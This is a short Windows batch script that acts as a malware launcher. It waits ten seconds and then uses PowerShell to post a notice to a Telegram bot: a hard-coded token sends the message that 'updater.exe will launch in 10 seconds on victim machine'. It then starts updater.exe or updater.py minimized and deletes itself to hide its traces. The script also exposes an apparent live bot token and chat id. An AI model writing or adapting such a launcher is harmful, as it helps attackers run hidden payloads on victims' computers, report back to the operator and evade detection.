@echo off
setlocal enabledelayedexpansion

REM Wait 10 seconds
timeout /t 10 /nobreak >nul

REM Send Telegram notification
powershell -Command "try { Invoke-RestMethod -Uri 'https://api.telegram.org/bot7985622762:AAHr_-P5AFfVrWYQiuC_7kZng3uXvqPwac0/sendMessage' -Method POST -ContentType 'application/json' -Body '{\"chat_id\":\"8088845855\",\"text\":\"🚀 updater.exe will launch in 10 seconds on victim machine.\"}' } catch { }"

REM Launch updater.exe if it exists
if exist "updater.exe" (
    start "" /min "updater.exe"
) else (
    REM Try to launch updater.py if exe doesn't exist
    if exist "updater.py" (
        start "" /min pythonw "updater.py"
    )
)

REM Delete this batch file
del "%~f0" >nul 2>&1 








